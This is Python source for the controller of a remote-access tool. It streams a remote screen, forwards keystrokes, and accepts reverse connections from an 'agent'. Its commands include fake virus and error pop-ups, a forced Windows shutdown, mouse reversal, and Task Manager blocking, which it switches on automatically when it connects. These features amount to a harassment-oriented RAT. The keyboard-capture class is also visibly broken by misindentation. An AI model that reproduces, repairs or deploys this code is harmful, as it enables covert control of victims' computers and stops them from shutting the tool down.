import socket
import cv2
import numpy as np
import zlib
import threading
import time
import keyboard
import sys
import argparse
import subprocess
import shutil
import os

class ScreenReceiver(threading.Thread):
    def __init__(self, sock):
        super().__init__(daemon=True)
        self.sock = sock
        self._running = True
        self._lock = threading.Lock()

    def stop(self):
        with self._lock:
            self._running = False

    def is_running(self):
        with self._lock:
            return self._running

    def run(self):
        while self.is_running():
            try:
                size_bytes = self._recv_exact(4)
                if not size_bytes:
                    print("[CLIENT] Screen socket closed")
                    break
                size = int.from_bytes(size_bytes, "big")
                if size <= 0:
                    continue
                compressed = self._recv_exact(size)
                if not compressed:
                    print("[CLIENT] Failed to receive full frame")
                    break
                img_data = zlib.decompress(compressed)
                img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
                if img is not None:
                    cv2.imshow("Remote Screen", img)
                    if cv2.waitKey(1) & 0xFF == 27:  # ESC
                        print("[CLIENT] ESC pressed in screen window, stopping...")
                        self.stop()
                        break
            except Exception as e:
                print(f"[CLIENT] ScreenReceiver error: {e}")
                break
        self.stop()
        cv2.destroyAllWindows()

    def _recv_exact(self, length: int):
        data = b""
        while len(data) < length and self.is_running():
            chunk = self.sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data

class KeyboardCapture:
    def __init__(self, sock):
        self.sock = sock
        self.capturing = False
        self.hook = None

    def start_capture(self):
        if self.capturing:
            return
        self.capturing = True
        print("Keyboard capture started. Press ESC to stop.")

    def on_key_event(e):
        if not self.capturing:
            return False
        if e.event_type == keyboard.KEY_DOWN:
            if e.name == "esc":
                self.stop_capture()
                return False
            try:
                key_data = f"key {e.name}"
                self.sock.sendall(key_data.encode())
            except Exception:
                print("Failed to send key event")
                self.stop_capture()
                return False
        self.hook = keyboard.hook(on_key_event)

    def stop_capture(self):
        if self.capturing:
            self.capturing = False
            if self.hook:
                keyboard.unhook(self.hook)
                self.hook = None
            print("Keyboard capture stopped")

class CommandSender(threading.Thread):
    def __init__(self, sock, screen_receiver: ScreenReceiver):
        super().__init__(daemon=True)
        self.sock = sock
        self.screen_receiver = screen_receiver
        self._running = True
        self._lock = threading.Lock()
        self.send_lock = threading.Lock()
        self.command_delay = 0.1
        self.keyboard_capture = KeyboardCapture(sock)
        # лог-окно
        self.log_lines = []
        self.max_log_lines = 12
        # кнопки в мини-окне
        self.buttons = []
        self._init_log_window()
        self._init_buttons()

    # ---------- ИНИЦИАЛИЗАЦИЯ МИНИ-ОКНА И КНОПОК ----------
    def _init_log_window(self):
        try:
            cv2.namedWindow("Server actions", cv2.WINDOW_NORMAL)
            cv2.resizeWindow("Server actions", 500, 300)
            cv2.setMouseCallback("Server actions", self._on_mouse)
            self._update_log("Client started. Waiting for commands...")
        except Exception as e:
            print(f"Failed to init log window: {e}")

    def _init_buttons(self):
        """
        Задаём панель кнопок снизу мини-окна.
        Каждая кнопка: {label, command(s), x1,y1,x2,y2}
        """
        btn_w = 110
        btn_h = 30
        margin_x = 10
        margin_y = 10
        cols = 3
        labels_and_cmds = [
            ("Reverse", ["reverse_mouse"]),
            ("Block TM", ["block_taskmgr"]),
            ("Vol+", ["volume_up 5"]),
            ("Vol-", ["volume_down 5"]),
            ("Mute", ["mute"]),
            ("Notepad", ["open_notepad"]),
            ("Msg Hi", ["msg Hello from client"]),
            ("Rick", ["rick"]),
            ("FakeErr", ["fake_error"]),
            ("Shutdown", ["shutdown"]),
        ]
        # размещаем кнопки сеткой снизу
        # считаем количество рядов
        rows = (len(labels_and_cmds) + cols - 1) // cols
        window_h = 300
        # высота панели
        panel_h = rows * (btn_h + margin_y) + margin_y
        top_y = window_h - panel_h
        self.buttons = []
        for idx, (label, cmds) in enumerate(labels_and_cmds):
            row = idx // cols
            col = idx % cols
            x1 = margin_x + col * (btn_w + margin_x)
            y1 = top_y + margin_y + row * (btn_h + margin_y)
            x2 = x1 + btn_w
            y2 = y1 + btn_h
            self.buttons.append({
                "label": label,
                "commands": cmds,
                "x1": x1,
                "y1": y1,
                "x2": x2,
                "y2": y2,
            })

    # ---------- РИСОВАНИЕ ЛОГОВ И КНОПОК ----------
    def _update_log(self, message: str):
        try:
            self.log_lines.append(message)
            if len(self.log_lines) > self.max_log_lines:
                self.log_lines = self.log_lines[-self.max_log_lines:]
            img = np.zeros((300, 500, 3), dtype=np.uint8)
            # область логов — всё, что выше панели с кнопками
            # найдём минимальный y среди кнопок
            panel_top = 300
            if self.buttons:
                panel_top = min(b["y1"] for b in self.buttons)
            y0 = 25
            dy = 20
            max_lines = max(0, (panel_top - y0) // dy)
            lines_to_show = self.log_lines[-max_lines:] if max_lines > 0 else []
            for i, line in enumerate(lines_to_show):
                y = y0 + i * dy
                cv2.putText(
                    img,
                    line[:60],
                    (10, y),
                    cv2.FONT_HERSHEY_SIMPLEX,
                    0.5,
                    (0, 255, 0),
                    1,
                    cv2.LINE_AA,
                )
            # рисуем кнопки
            for b in self.buttons:
                cv2.rectangle(
                    img,
                    (b["x1"], b["y1"]),
                    (b["x2"], b["y2"]),
                    (0, 255, 255),
                    1,
                )
                # центрируем текст по вертикали примерно
                text_size, _ = cv2.getTextSize(
                    b["label"], cv2.FONT_HERSHEY_SIMPLEX, 0.5, 1
                )
                text_w, text_h = text_size
                text_x = b["x1"] + (b["x2"] - b["x1"] - text_w) // 2
                text_y = b["y1"] + (b["y2"] - b["y1"] + text_h) // 2
                cv2.putText(
                    img,
                    b["label"],
                    (text_x, text_y),
                    cv2.FONT_HERSHEY_SIMPLEX,
                    0.5,
                    (0, 255, 255),
                    1,
                    cv2.LINE_AA,
                )
            cv2.imshow("Server actions", img)
            cv2.waitKey(1)
        except Exception as e:
            print(f"Failed to update log window: {e}")

    # ---------- ОБРАБОТКА КЛИКОВ В МИНИ-ОКНЕ ----------
    def _on_mouse(self, event, x, y, flags, param):
        if event == cv2.EVENT_LBUTTONUP:
            for b in self.buttons:
                if b["x1"] <= x <= b["x2"] and b["y1"] <= y <= b["y2"]:
                    # при клике по кнопке отправляем связанные команды
                    for cmd in b["commands"]:
                        self.send_command(cmd)
                    break

    # ---------- СЛУЖЕБНОЕ ----------
    def stop(self):
        with self._lock:
            self._running = False
        self.keyboard_capture.stop_capture()
        try:
            cv2.destroyWindow("Server actions")
        except Exception:
            pass

    def is_running(self):
        with self._lock:
            return self._running

    # ---------- ОТПРАВКА КОМАНД (из консоли и из кнопок) ----------
    def send_command(self, cmd: str):
        """
        Универсальный метод: отправляет команду на сервер, пишет в лог,
        читает ответ. Вызывается и из run(), и из обработчика кнопок.
        """
        if not self.is_running() or not self.screen_receiver.is_running():
            return
        # специальные локальные команды
        if cmd == "exit":
            self.stop()
            self.screen_receiver.stop()
            try:
                self.sock.sendall(cmd.encode())
            except Exception:
                pass
            return
        if cmd == "keyboard_capture":
            self.keyboard_capture.start_capture()
            return
        try:
            with self.send_lock:
                print(f"Sending: {cmd}")
                self._update_log(f"> {cmd}")
                self.sock.sendall(cmd.encode())
                # ждём ответ сервера
                try:
                    self.sock.settimeout(3.0)
                    response = self.sock.recv(4096)
                    if response:
                        text = response.decode(errors="ignore").strip()
                        if text:
                            print(f"Server: {text}")
                            self._update_log(f"< {text}")
                except socket.timeout:
                    pass
                finally:
                    self.sock.settimeout(None)
        except Exception as e:
            print(f"Error sending command '{cmd}': {e}")

    # ---------- ОСНОВНОЙ ЦИКЛ (консоль + мини-окно) ----------
    def run(self):
        print("\nAvailable commands (console):")
        print("move x y - move mouse relative")
        print("click left/right - click mouse button")
        print("automove [speed] - auto movement (0.01-1.0)")
        print("autoclick [int] - auto clicks (seconds)")
        print("rick - open Rick Astley :)")
        print("fake_virus - fake virus alert")
        print("shutdown - real Windows shutdown")
        print("fake_error - fake system error")
        print("reverse_mouse - toggle reverse mouse")
        print("type - type text on server")
        print("open - open URL in browser")
        print("key X - press key X")
        print("keyboard_capture - capture local keyboard, send to server (ESC to stop)")
        print("block_taskmgr - toggle Task Manager blocking")
        print("volume_up [steps] - volume up (default 5)")
        print("volume_down [steps]- volume down (default 5)")
        print("mute - mute/unmute sound")
        print("open_notepad - open Notepad")
        print("msg - show message box with text")
        print("exit - disconnect client")
        print("\nAlso you can control via buttons in 'Server actions' window.")
        print("You can send multiple commands at once separated by ';' in console.")
        self._update_log("Client ready. Waiting for commands...")
        # включаем блокировку диспетчера задач по умолчанию
        try:
            self.sock.sendall("block_taskmgr".encode())
            resp = self.sock.recv(4096).decode(errors="ignore").strip()
            if resp:
                print(resp)
                self._update_log(f"< {resp}")
        except Exception as e:
            print(f"Failed to send initial block_taskmgr: {e}")
        while self.is_running() and self.screen_receiver.is_running():
            try:
                cmd_input = input("Command(s): ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\nStopping client...")
                self.send_command("exit")
                break
            if not cmd_input:
                continue
            commands = [c.strip() for c in cmd_input.split(";") if c.strip()]
            for cmd in commands:
                if not self.is_running() or not self.screen_receiver.is_running():
                    break
                self.send_command(cmd)
                if len(commands) > 1:
                    time.sleep(self.command_delay)

def get_server_address():
    """
    Принимаем IP, домен или 'localhost'.
    """
    host = input("Enter server address (IP / domain / 'localhost'): ").strip()
    if not host:
        return "127.0.0.1"
    if host.lower() == "localhost":
        return "127.0.0.1"
    return host

def parse_args():
    p = argparse.ArgumentParser(description="Remote control CONTROLLER (client side)")
    p.add_argument(
        "--mode",
        choices=["connect", "listen"],
        default="connect",
        help="connect: подключиться к агенту; listen: ждать reverse-подключения агента",
    )
    p.add_argument(
        "--host",
        help="connect: адрес агента; listen: локальный интерфейс",
        default=None,
    )
    p.add_argument("--screen-port", type=int, default=65432)
    p.add_argument("--cmd-port", type=int, default=65433)
    return p.parse_args()

def main():
    # проверка зависимостей
    try:
        import cv2  # noqa
        import numpy  # noqa
        import zlib  # noqa
        import keyboard  # noqa
    except ImportError as e:
        print(f"Error: Required library not found - {e}")
        print("Please install with: pip install opencv-python numpy keyboard")
        sys.exit(1)

    args = parse_args()

    if args.mode == "connect":
        host = args.host or get_server_address()
        screen_port = args.screen_port
        cmd_port = args.cmd_port
        print(
            f"[CLIENT] Connecting to agent {host} (screen:{screen_port}, cmd:{cmd_port})..."
        )
        try:
            raw_screen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_screen_sock.connect((host, screen_port))
            screen_sock = raw_screen_sock
            print("[CLIENT] Connected to screen stream")
            raw_cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_cmd_sock.connect((host, cmd_port))
            cmd_sock = raw_cmd_sock
            print("[CLIENT] Connected to command port")
        except Exception as e:
            print(f"[CLIENT] Failed to connect: {e}")
            return
        receiver = ScreenReceiver(screen_sock)
        sender = CommandSender(cmd_sock, receiver)
        receiver.start()
        sender.start()
        sender.join()
        receiver.stop()
        receiver.join()
        screen_sock.close()
        cmd_sock.close()
        print("[CLIENT] Exited")
    else:  # listen mode — ждём reverse-подключения агента
        host = args.host or "0.0.0.0"
        screen_port = args.screen_port
        cmd_port = args.cmd_port
        print(
            f"[CLIENT] LISTEN mode on {host}:{screen_port}/{cmd_port}"
        )
        # слушаем экран
        screen_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        screen_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        screen_listener.bind((host, screen_port))
        screen_listener.listen(1)
        # слушаем команды
        cmd_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cmd_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cmd_listener.bind((host, cmd_port))
        cmd_listener.listen(1)
        try:
            raw_screen_sock, s_addr = screen_listener.accept()
            screen_sock = raw_screen_sock
            print(f"[CLIENT] Screen connection from {s_addr}")
            raw_cmd_sock, c_addr = cmd_listener.accept()
            cmd_sock = raw_cmd_sock
            print(f"[CLIENT] Command connection from {c_addr}")
            receiver = ScreenReceiver(screen_sock)
            sender = CommandSender(cmd_sock, receiver)
            receiver.start()
            sender.start()
            sender.join()
            receiver.stop()
            receiver.join()
            screen_sock.close()
            cmd_sock.close()
        finally:
            screen_listener.close()
            cmd_listener.close()
        print("[CLIENT] LISTEN mode finished")

if __name__ == "__main__":
    main()
